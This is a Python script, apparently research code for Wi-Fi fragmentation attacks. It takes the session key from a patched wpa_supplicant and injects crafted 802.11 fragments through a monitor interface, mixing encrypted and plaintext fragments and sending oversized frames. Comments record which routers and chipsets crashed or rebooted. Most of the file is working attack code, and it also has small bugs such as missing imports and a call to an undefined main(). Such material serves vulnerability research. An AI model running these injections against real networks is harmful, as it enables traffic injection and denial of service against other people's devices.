#!/usr/bin/env python3
from libwifi import*
import sys, socket, struct, time, subprocess, atexit, select
from wpaspy import Ctrl

#def main(interface):
#	conf.iface = interface + "mon"
#	inject_fragmented()

#MAC_STA2 = "d0:7e:35:d9:80:91"
#MAC_STA2 = "20:16:b9:b2:73:7a"
MAC_STA2 = "80:5a:04:d4:54:c4"

def wpaspy_clear_messages(ctrl):
	# Clear old replies and messages from the hostapd control interface
	while ctrl.pending():
		ctrl.recv()

def wpaspy_command(ctrl, cmd):
	wpaspy_clear_messages(ctrl)
	rval = ctrl.request(cmd)
	if "UNKNOWN COMMAND" in rval:
		log(ERROR, "wpa_supplicant did not recognize the command %s. Did you (re)compile wpa_supplicant?" % cmd.split()[0])
		quit(1)
	elif "FAIL" in rval:
		log(ERROR, "Failed to execute command %s" % cmd)
		quit(1)
	return rval

class FragAttack():
	def __init__(self, interface):
		self.nic_iface = interface
		# Note: some kernels don't support long names
		self.nic_mon = "mon" + interface[:12]
		self.clientmac = None

		self.sock  = None
		self.wpasupp = None
		self.wpasupp_ctrl = None

		self.apmac = None
		self.tk = None
		self.pn = 0x99

	def inject_fragments_linux(self):
		assert self.tk

		payload1 = b"A" * 16
		payload2 = b"B" * 16
		payload3 = b"C" * 16
		seqnum = 0xAA
		addr3 = MAC_STA2

		# Frame 1: encrypted normal fragment
		frag1 = Dot11(type="Data", FCfield="to-DS+MF", addr1=self.apmac, addr2=self.clientmac, addr3=addr3, SC=(seqnum << 4) | 0)/Raw(payload1)
		frag1 = encrypt_ccmp(frag1, self.tk, self.pn)
		self.pn += 1

		# Frame 2: encrypted fragment with different CS but incremental PN.
		#	   sent fragmented to prevent receiving from processing it.
		frag2 = Dot11(type="Data", FCfield="to-DS", addr1=self.apmac, addr2=self.clientmac, addr3=addr3, SC=((seqnum ^ 1) << 4) | 1)/Raw(payload2)
		frag2 = encrypt_ccmp(frag2, self.tk, self.pn)
		self.pn += 1

		# Frame 3: plaintext fragment with same CS as the first encrypted fragment
		frag3 = Dot11(type="Data", FCfield="to-DS", addr1=self.apmac, addr2=self.clientmac, addr3=addr3, SC=(seqnum << 4) | 1)/Raw(payload3)

		sendp(RadioTap()/frag1, iface=self.nic_mon)
		sendp(RadioTap()/frag2, iface=self.nic_mon)
		sendp(RadioTap()/frag3, iface=self.nic_mon)

	def inject_fragments(self, ping=False, num_frags=3):
		seqnum = 0xAA
		addr3 = MAC_STA2
		if ping:
			data = raw(LLC()/SNAP()/IP(dst="192.168.4.100", src="192.168.4.101")/ICMP())
		else:
			# ath9k_htc:
			# - The WNDA3200 firmware crashes when sending a frame of 2000+ bytes
			#
			# Values for WAG320 (Broadcom BCM4322):
			# - 1900-1988 caused the WAG320N to reboot when it was the first fragmented frame after boot,
			#             and without the second client being connected.
			#             Does work after sending initial short fragmented frame and with 2nd client being connected!
			# - 1995 is not forwarded to 2nd client, even after first sending smaller fragmented packets.
			# - Conclusion: can't force fragmention of frames, but perhaps vulnerable to memory-safety bugs.
			#
			# RT-N10 with TomatoUSB (Broadcom BCM5356):
			# - works: 1500, 1700, 1900, 1950, 1980 works
			# - To inject a frame of 1990 it was essential to use 4 fragments
			# - Anything higher than 1990 seems to fail
			# - Conclusion: maybe Broadcom has an issue with large Wi-Fi frames?
			#
			# Asus router:
			# - 1500: works when sending in two fargments
			# - 1600: does not work. Also not visible in tcpdump when the final destination MAC address is the AP,
			#         while for 1500 it then does also show in tcpdump (with final dst being AP).
			#         After updating the interace mtu using ip link, this still didn't work.
			# - 1700: does not work
			#
			# Nexus 5X hotspot:
			# - 2000,2300,2400,2500,3000 works
			# - 4000 phone receives it (checked with tcpdump). Crashes the Intel chip of the laptop...?
			# - 5/6/7/8/9/10/20/22k phone receives it (checked with tcpdump - no associated client to check Intel chip)
			#   When a client is connected, it cannot forward large frames though (not sent at all). We could send a
			#   frame to the client of size 2500 (as a single frame), but were unable to send 3000. When we disconnected
			#   the client, the frame did show up in tcpdump (if the client is connect it doesn't show up and seems to be
			#   immediately forwarded without reaching other parts of the network stack).
			# - Conclusion: it seems we cannot force fragmentation in this why against most devices.
			# - TODO: did we actually tested whether this would work against Linux?
			# - TODO: Maybe in client mode fragmented frames can cause crashes?
			#
			# TODO: Inject a very large (>2346 single-frame Wi-Fi frame)
			data = b"A" * 3000

		fragments = []
		fragsize = (len(data) + 1) // num_frags
		for i in range(num_frags):
			fc = "to-DS" if i == num_frags - 1 else "to-DS+MF"
			payload = data[fragsize * i : fragsize * (i + 1)]
			frag = Dot11(type="Data", FCfield=fc, addr1=self.apmac, addr2=self.clientmac, addr3=addr3, SC=(seqnum << 4) | i)/Raw(payload)
			if self.tk: frag = encrypt_ccmp(frag, self.tk, self.pn)
			fragments.append(RadioTap()/frag)
			#fragments.append(RadioTap()/frag)

		for i in range(100):
			time.sleep(2)
			sendp(fragments, iface=self.nic_mon)

	def inject_ping(self, numbytes=16):
		addr3 = MAC_STA2

		p = Dot11(type="Data", FCfield="to-DS", addr1=self.apmac, addr2=self.clientmac, addr3=addr3)
		p = p/LLC()/SNAP()/IP(dst="192.168.4.100", src="192.168.4.101")/ICMP()/Raw(b"A" * numbytes)
		if self.tk:
			p = encrypt_ccmp(p, self.tk, self.pn)
			self.pn += 1000

		for i in range(100):
			sendp(RadioTap()/p, iface=self.nic_mon)

	def handle_rx(self):
		p = self.sock.recv()
		if p == None: return

		#self.process_frame(p)

	def get_tk(self):
		self.tk = wpaspy_command(self.wpasupp_ctrl, "GET tk")
		if self.tk == "none":
			self.tk = None
			log(STATUS, "No key being used")
		else:
			print(self.tk)
			self.tk = bytes.fromhex(self.tk)
			log(STATUS, "TK: " + self.tk.hex())

	def handle_wpasupp(self):
		while self.wpasupp_ctrl.pending():
			msg =self.wpasupp_ctrl.recv()
			log(STATUS, "wpasupp: " + msg)

			if "CTRL-EVENT-CONNECTED" in msg:
				p = re.compile("Connection to (.*) completed")
				self.apmac = p.search(msg).group(1)
				self.get_tk()

				time.sleep(1)
				self.inject_fragments()
				#self.inject_ping(numbytes=2000)

	def configure_interfaces(self):
		log(STATUS, "Note: disable Wi-Fi in your network manager so it doesn't interfere with this script")

		# 0. Some users may forget this otherwise
		subprocess.check_output(["rfkill", "unblock", "wifi"])

		# 1. Remove unused virtual interfaces to start from a clean state
		subprocess.call(["iw", self.nic_mon, "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)

		# 2. Configure monitor mode on interfaces
		subprocess.check_output(["iw", self.nic_iface, "interface", "add", self.nic_mon, "type", "monitor"])
		# Some kernels (Debian jessie - 3.16.0-4-amd64) don't properly add the monitor interface. The following ugly
		# sequence of commands assures the virtual interface is properly registered as a 802.11 monitor interface.
		subprocess.check_output(["iw", self.nic_mon, "set", "type", "monitor"])
		time.sleep(0.5)
		subprocess.check_output(["iw", self.nic_mon, "set", "type", "monitor"])
		subprocess.check_output(["ifconfig", self.nic_mon, "up"])

	def run(self):
		self.configure_interfaces()

		self.sock = MonitorSocket(type=ETH_P_ALL, iface=self.nic_mon)

		# Open the patched hostapd instance that carries out tests and let it start
		log(STATUS, "Starting wpa_supplicant ...")
		try:
			self.wpasupp = subprocess.Popen([
				"../wpa_supplicant/wpa_supplicant",
				"-Dnl80211",
				"-i", self.nic_iface,
				"-cclient.conf"])
		except:
			if not os.path.exists("../wpa_supplicant/wpa_supplicant"):
				log(ERROR, "wpa_supplicant executable not found. Did you compile wpa_supplicant? Use --help param for more info.")
			raise
		time.sleep(1)

		# Open the wpa_supplicant client that will connect to the network that will be tested
		self.clientmac = scapy.arch.get_if_hwaddr(self.nic_iface)
		try:
			self.wpasupp_ctrl = Ctrl("wpasupp_ctrl/" + self.nic_iface)
			self.wpasupp_ctrl.attach()
		except:
			log(ERROR, "It seems wpa_supplicant did not start properly, please inspect its output.")
			log(ERROR, "Did you disable Wi-Fi in the network manager? Otherwise wpa_supplicant won't work.")
			raise

		# Monitor the virtual monitor interface of the client and perform the needed actions
		while True:
			sel = select.select([self.sock, self.wpasupp_ctrl.s], [], [], 1)
			if self.sock in sel[0]: self.handle_rx()
			if self.wpasupp_ctrl.s in sel[0]: self.handle_wpasupp()

	def stop(self):
		log(STATUS, "Closing wpa_supplicant and cleaning up ...")
		if self.wpasupp:
			self.wpasupp.terminate()
			self.wpasupp.wait()
		if self.sock: self.sock.close()


def cleanup():
	attack.stop()

if __name__ == "__main__":
	if len(sys.argv) != 2:
		print("Usage:", sys.argv[0], "interface")
		quit(1)

	attack = FragAttack(sys.argv[1])
	atexit.register(cleanup)
	attack.run()

	main()

